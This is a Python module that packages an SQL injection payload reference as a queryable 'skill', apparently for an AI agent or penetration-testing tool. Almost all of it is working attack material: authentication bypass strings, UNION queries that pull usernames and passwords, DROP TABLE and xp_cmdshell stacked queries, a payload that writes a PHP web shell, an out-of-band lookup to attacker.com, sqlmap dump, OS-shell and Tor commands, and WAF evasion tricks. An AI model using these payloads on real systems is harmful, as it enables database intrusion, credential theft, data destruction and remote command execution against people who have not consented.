"""Skill: skill-sqli — SQL Injection knowledge base.

Covers: entry point detection, DBMS identification, authentication bypass,
UNION-based, error-based, boolean/time/blind, stacked, polyglot,
sqlmap commands, WAF bypass techniques.

Source: PayloadsAllTheThings (SQL Injection + MySQL Injection README).
"""

from __future__ import annotations

from typing import Any

SKILL_ID = "skill-sqli"
SKILL_NAME = "sqli"
SKILL_PURPOSE = "SQL Injection reference: types, manual exploitation, sqlmap, WAF bypass."

SQLI_KB = r"""
# SQL Injection Knowledge Base

## Entry Point Detection
- Single quote: '  → error? SQLi likely.
- Double quote: "  → error? SQLi likely.
- Boolean: ' OR '1'='1  vs  ' AND '1'='2  → different responses = boolean blind.
- Time: ' OR SLEEP(5)--  (MySQL) / ' WAITFOR DELAY '0:0:5'--  (MSSQL).
- Numeric: -1 OR 1=1  /  -1 OR 1=2  → different responses.
- OAST: load_file('\\\\attacker.com\\x') (MySQL) / xp_dirtree (MSSQL).

## DBMS Identification
- MySQL: /*!50000...*/ version comment, SLEEP(), BENCHMARK(), @@version.
- MSSQL: WAITFOR DELAY, @@version, xp_cmdshell, sysobjects.
- Oracle: DBMS_PIPE.RECEIVE_MESSAGE, dual, UTL_HTTP, all_tables.
- PostgreSQL: pg_sleep(), information_schema, COPY, lo_import.
- SQLite: sqlite_master, no information_schema, randomblob().

## Authentication Bypass
- Basic: ' OR '1'='1' --
- Admin: admin'--
- Union: ' UNION SELECT 1,'admin','hash'--
- Raw MD5: pass=' union select 'md5raw'  (pass=129581926211651571912466741741878684928)

## UNION-Based Injection
1. Detect columns: ORDER BY 1,2,3... until error.
2. Find visible: UNION SELECT 1,2,3...
3. Extract DB: UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--
4. Extract tables: UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='db'--
5. Extract columns: UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
6. Extract data: UNION SELECT 1,group_concat(username,':',password),3 FROM users--

## Error-Based Injection
- MySQL: extractvalue(1,concat(0x7e,(SELECT database())))
- MySQL: updatexml(1,concat(0x7e,(SELECT user())),1)
- MSSQL: convert(int,@@version)
- PostgreSQL: cast((SELECT current_database()) as int)

## Boolean Blind
- AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'
- ASCII: AND ASCII(SUBSTRING((SELECT password),1,1))>64

## Time-Based Blind
- MySQL: ' AND IF(1=1,SLEEP(5),0)--
- MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'--
- PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

## Stacked Queries
- MySQL: '; DROP TABLE users;--
- MSSQL: '; EXEC xp_cmdshell('whoami');--
- PostgreSQL: '; CREATE TABLE pwn(id int);--

## File Operations (MySQL)
- Read file: UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
- Write shell: UNION SELECT 1,'<?php system($_GET["c"]); ?>',3 INTO OUTFILE '/var/www/shell.php'--

## Polyglot Injection
- Universal payload working across multiple DBMS:
  SLEEP(1) /*' AND SLEEP(1) AND '*/--
  OR 1=1 /*' OR '1'='1

## sqlmap Quick Reference
- Basic: sqlmap -u "http://target.com/page.php?id=1"
- POST: sqlmap -u "http://target.com/login" --data="user=admin&pass=admin"
- Dump: sqlmap -u "..." --dump
- Database list: sqlmap -u "..." --dbs
- Tables: sqlmap -u "..." -D dbname --tables
- Columns: sqlmap -u "..." -D dbname -T users --columns
- OS shell: sqlmap -u "..." --os-shell
- Tamper scripts (WAF bypass): --tamper=space2comment,randomcase,between,charencode
- List tampers: sqlmap --list-tampers
- Tor: sqlmap -u "..." --tor --tor-type=SOCKS5
- Crawl: sqlmap -u "..." --crawl=3

## WAF Bypass Techniques
- No spaces: /**/ or + or %09 or %0a or `
  Example: ' UNION/**/SELECT/**/1,2,3--
- No commas: JOIN or OFFSET
  Example: UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
- No equals: LIKE or REGEXP or BETWEEN
  Example: AND 1 LIKE 1  (instead of 1=1)
- Case modification: SeLeCt, UnIoN, FrOm
- Hex encoding: 0x61646d696e (admin in hex)
- Comment obfuscation: /**/!UNION/**/SELECT
- Double URL encoding: %2527 → '
- Alternative to information_schema (MySQL):
  - sys.schema_auto_increment_columns
  - innodb_table_stats
  - mysql.innodb_table_stats
"""


def run(context: dict[str, Any]) -> str:
    topic = (context.get("query") or context.get("user_input") or "").strip().lower()

    if not topic:
        return f"[skill-sqli] SQL Injection reference loaded. Ask about: entry points, union, error, blind, time, stacked, polyglot, sqlmap, waf bypass."

    lines = SQLI_KB.split("\n")
    section_lines = []
    in_section = False

    for line in lines:
        if line.startswith("##") and topic.replace(" ", "-") in line.lower().replace(" ", "-"):
            in_section = True
            section_lines.append(line)
        elif line.startswith("##") and in_section:
            break
        elif in_section:
            section_lines.append(line)

    if section_lines:
        return "\n".join(section_lines)

    matched = [line for line in lines if topic in line.lower() and line.strip()]
    if matched:
        return f"[skill-sqli] Found {len(matched)} lines matching '{topic}':\n" + "\n".join(matched[:30])

    return f"[skill-sqli] Topic '{topic}' not found. Available: entry points, union, error, blind, time, stacked, polyglot, sqlmap, waf bypass, file operations."